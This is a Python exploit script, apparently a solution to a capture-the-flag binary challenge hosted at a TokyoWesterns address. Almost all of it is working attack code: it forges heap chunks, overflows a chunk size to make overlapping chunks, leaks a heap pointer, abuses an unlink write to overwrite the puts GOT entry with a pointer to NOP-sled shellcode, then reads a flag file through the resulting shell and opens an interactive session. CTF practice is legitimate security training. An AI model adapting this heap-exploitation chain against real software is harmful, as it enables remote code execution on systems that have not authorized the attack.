#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "pwn1.chal.ctf.westerns.tokyo"
    PORT = 13856

DBG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

def reg(date, data, dsize=None, endl=True):
    if dsize is None:
        dlen = len(data)
    else:
        dlen = dsize
    s.send("1\n")
    rtil("... ")
    if endl:
        s.send(date + "\n")
    else:
        s.send(date)
    rtil("... ")
    s.send(str(dlen) + "\n")
    rtil(">> ")
    if data != "":
        s.send(data)
        return rtil(">> ")

def show(date):
    s.send("2\n")
    s.send(date + "\n")
    return rtil(">> ")

def delete(date, n=False):
    s.send("3\n")
    s.send(date + "\n")
    if not n:
        return rtil(">> ")
    else:
        return

rtil(">> ")

# make some "working space"
# we use this later to retrigger the bug
# and get almost arbitrary write
print "creating working space..."
for i in range(5):
    reg(str(2000 + i) + "/01/01", "A" * 0x20)

print "creating initial actors..."
reg(str(1970) + "/01/01", "A" * 0x20)
reg(str(1971) + "/01/01", "C" * 0x20)
reg(str(1972) + "/01/01", "A" * 0x20)

# these are our fake chunks
# that we use for arbitrary write
# they also store our shellcode
# v4
buf = p64(0x21)                     # point to v5 chunk
buf += p64(0x424242)
buf += p64(0x434343)
buf += p64(0x45454545)
# v5
buf += p64(0x21)                    # flag is set here to avoid unlink path
buf += "\x90" * 40
buf += open("sc.bin", "r").read()
buf = buf.ljust(256, "A")
reg(str(1973) + "/01/01", buf)

# make a hole
print "inserting hole..."
delete(str(1971) + "/01/01")

# reclaim the hole
# overflow into adjacent chunk to exand its size
# and make point to our fake chunks above
# we will have some overlapping chunk now

print "reclaiming hole..."
buf = "A" * 0x20
buf += chr(0x81)
reg(str(1971) + "/01/01", buf, dsize=0x20)
delete(str(1972) + "/01/01")

print "corrupting an object..."
# corrupt the overlapping chunk
# in order to leak a heap pointer
# and also in order corrupt its size
# so that we can make it point to a fake chunk
# that we will later use for arbitrary write
# we put a negative offset because our fake chunk
# will be in the "working space" allocated before
# this guy, but reclaimed after the heap pointer leak
mmaped_buf = 0x602118
buf = "A" * 0x20
buf += p64(0xfffffffffffffdd8 | 1)  # this is
buf += p64(0x00000101000007b9)      # a valid date so we can show() it
buf += p64(mmaped_buf)
reg(str(1974) + "/01/01", buf, dsize=len(buf) - 1)

# leak heap pointer
heap_leak = show("1977/01/01")
heap_leak = heap_leak.split("\n")[-4]
heap_leak = heap_leak.ljust(8, "\x00")
heap_leak = u64(heap_leak)
print "heap pointer: %s"%hex(heap_leak)

for i in range(5):
    delete(str(2000 + i) + "/01/01")

puts_got = 0x602020
what = heap_leak + 0x90 # shell_code_addr
where = puts_got
buf = p64(0x21)
buf += p64(what)
buf += p64(where - 8)
buf += p64(0x45454545)
# v5
buf += p64(0x20)
buf = buf.ljust(0x7f, "A")
reg(str(2000) + "/01/01", buf)

# finally trigger it
delete(str(1977) + "/01/01", True)
rtil("... ")

reader = """while read line
do
echo $line
done < flagflag_oh_i_found
"""
s.send(reader)
s.send("exit\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
